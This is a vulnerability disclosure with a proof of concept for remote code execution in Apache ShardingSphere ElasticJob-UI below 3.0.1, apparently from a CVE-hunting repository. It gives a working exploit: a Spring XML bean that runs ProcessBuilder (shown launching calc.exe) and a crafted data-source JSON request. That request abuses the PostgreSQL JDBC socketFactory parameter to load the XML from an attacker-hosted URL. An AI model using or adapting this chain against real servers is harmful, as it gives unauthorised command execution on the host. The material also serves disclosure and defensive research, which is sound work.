# Apache ShardingSphere ElasticJob-UI  < 3.0.1 postgresql RCE

Apache ShardingSphere ElasticJob-UI Due to the wide range of impact of the vulnerability, the vulnerability is serious enough to cause direct access to the control privileges of the server where the application system is located.

Affected versions of this package are vulnerable to Remote Code Execution (RCE) when using certain plugin features. pgjdbc instantiates plugin instances based on class names provided via authenticationPluginClassName, sslhostnameverifier, socketFactory, sslfactory, and sslpasswordcallback connection properties.

Supplier：https://github.com/apache/shardingsphere-elasticjob-ui


Vulnerability Exploitation Chain

```
EventTraceDataSourceConfigurationServiceImpl#add
DataSourceFactory#createDataSource
EventTraceDataSourceConfiguration#init
DriverManager#getConnection
```

Driver` version is 42.2. and the framework used by `Apache ShardingSphere ElasticJob-UI` is `Springboot`.
In the case of specifying `JDBC URL`, malicious XML files can be loaded using `org.springframework.context.support.ClassPathXmlApplicationContext` leading to RCE exploitation.

### POC

Start an HTTP service and place an XML file with the following contents

```xml
<beans xmlns="http://www.springframework.org/schema/beans"
       xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
       xsi:schemaLocation="
     http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd">
    <bean id="pb" class="java.lang.ProcessBuilder">
        <constructor-arg value="calc.exe" />
        <property name="whatever" value="#{ pb.start() }"/>
    </bean>
</beans>
```

Then log in to the Apache ShardingSphere ElasticJob-UI backend, select Add `data source`, and replace the requested JSON with the following

```json
{"name":"test","driver":"org.postgresql.Driver","url":"jdbc:postgresql://localhost:5432/test?socketFactory=org.springframework.context.support.ClassPathXmlApplicationContext&socketFactoryArg=http://AttackIP/poc.xml","username":"test","password":"test"}
```

Use the following screenshots

![image](https://raw.githubusercontent.com/xidaner/CVE_HUNTER/main/img/2022-11-04/1.png)